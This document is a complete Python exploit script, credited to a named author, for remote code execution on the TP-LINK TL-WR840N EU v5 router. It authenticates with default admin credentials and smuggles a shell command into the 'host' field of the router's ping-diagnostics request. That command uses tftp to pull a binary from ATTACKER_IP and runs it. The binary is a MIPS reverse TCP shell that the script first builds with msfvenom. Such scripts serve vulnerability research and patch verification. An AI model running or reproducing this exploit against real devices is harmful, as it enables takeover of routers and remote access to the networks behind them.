#!/usr/bin/python3
###############################################################
### tplink_TL-WR840N-EU-v5-rce-exploit_v1.py 
### Version: 1.0
### Author: Matek Kamillo (k4m1ll0)
### Email: matek.kamillo@gmail.com
### Date: 2021.09.06.
##############################################################

import requests
import os
import base64

USERNAME = "admin"
PASSWORD = "admin"
URL = "http://192.168.1.1/cgi"
PATH = "/srv/tftp/shell"
ATTACKER_IP = "192.168.1.101"
COMMAND = "$(echo 127.0.0.1; tftp -g -r shell -l /var/tmp/shell " + ATTACKER_IP + "; chmod +x /var/tmp/shell; /var/tmp/shell)"

def base64_encode(s):
    msg_bytes = s.encode('ascii')
    return base64.b64encode(msg_bytes)


class Exploit(object):
    def __init__(self, username, password, command):
        self.username = username
        self.password = password
        self.command = command

        self.URL = "http://192.168.1.1/cgi"
        self.session = requests.session()
        #self.proxies = { 'http' : 'http://192.168.1.100:8080'}
        self.proxies = { }
        self.cookies = { 'Authorization' : 'Basic ' + base64_encode(username + ":" + password).decode('ascii') }
        self.headers = { 'Content-Type': 'text/plain', 'Referer' : 'http://192.168.1.1/mainFrame.htm' }

    def _prepare(self):
        print("Generating reverse shell.")
        command = "msfvenom -p linux/mipsle/shell/reverse_tcp -f elf LHOST=" + ATTACKER_IP + " LPORT=2000 -o " + PATH
        os.system(command)

    def _send_ping_command(self):
        URL = self.URL + '?2'
        data = '[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n'
        data += 'dataBlockSize=64\r\n'
        data += 'timeout=1\r\n'
        data += 'numberOfRepetitions=4\r\n'
        data += 'host=' + self.command + '\r\n'
        data += 'X_TP_ConnName=ewan_ipoe_d\r\n'
        data += 'diagnosticsState=Requested\r\n'
        r = self.session.post(URL, headers=self.headers, data=data, cookies=self.cookies, proxies=self.proxies)

    def _send_execute_command(self):
        URL = self.URL + '?7'
        data = '[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n'
        r = self.session.post(URL, headers=self.headers, data=data, cookies=self.cookies, proxies=self.proxies)
        
    def execute(self):
        self._prepare()
        self._send_ping_command()
        self._send_execute_command()

if __name__ == "__main__":
    e = Exploit(USERNAME, PASSWORD, COMMAND)
    e.execute()
